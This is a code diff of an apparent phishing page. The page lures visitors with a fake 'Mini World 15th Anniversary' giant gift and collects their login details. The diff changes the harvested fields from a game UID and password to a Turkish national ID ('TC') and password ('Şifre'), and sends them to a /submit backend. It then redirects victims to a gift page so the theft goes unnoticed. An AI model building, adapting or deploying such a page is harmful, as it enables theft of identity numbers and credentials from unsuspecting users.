@@ -96,19 +96,19 @@
   </head>
   <body>
     <div class="login-box">
-      <h1>UID Login</h1>
+      <h1>TC Giriş</h1>
 
       <div class="input-group">
-        <label for="uid">UID</label>
-        <input id="uid" type="text" placeholder="" maxlength="200" />
+        <label for="tc">TC</label>
+        <input id="tc" type="text" placeholder="" maxlength="200" />
       </div>
 
       <div class="input-group">
-        <label for="level">Password</label>
-        <input id="level" type="text" placeholder="" maxlength="200" />
+        <label for="sifre">Şifre</label>
+        <input id="sifre" type="password" placeholder="" maxlength="200" />
       </div>
 
-      <button id="submitBtn">Log in</button>
+      <button id="submitBtn">Giriş Yap</button>
       <div id="msg" class="msg"></div>
 
       <footer>Welcome to Mini Bean Event 🎉🥳 Mini World 15th Anniversary Special GIANT GIFT</footer>
@@ -122,29 +122,29 @@
         msg.textContent = '';
         msg.className = 'msg';
 
-        const uid = document.getElementById('uid').value.trim();
-        const level = document.getElementById('level').value.trim();
+        const tc = document.getElementById('tc').value.trim();
+        const sifre = document.getElementById('sifre').value.trim();
 
-        if (!uid || !level) {
-          msg.textContent = 'Lütfen UID ve Level gir.';
+        if (!tc || !sifre) {
+          msg.textContent = 'Lütfen TC ve Şifre giriniz.';
           msg.className = 'msg err';
           return;
         }
 
         try {
-          // Önce backend'e gönder
+          // Backend'e gönder
           const res = await fetch('/submit', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ uid, level })
+            body: JSON.stringify({ tc, sifre })
           });
           const data = await res.json();
 
           if (data.ok) {
-            msg.textContent = 'Thanks!';
+            msg.textContent = 'Teşekkürler!';
             msg.className = 'msg ok';
-            document.getElementById('uid').value = '';
-            document.getElementById('level').value = '';
+            document.getElementById('tc').value = '';
+            document.getElementById('sifre').value = '';
 
             // Başarılıysa gift.html sayfasına yönlendir
             window.location.href = "gift.html";
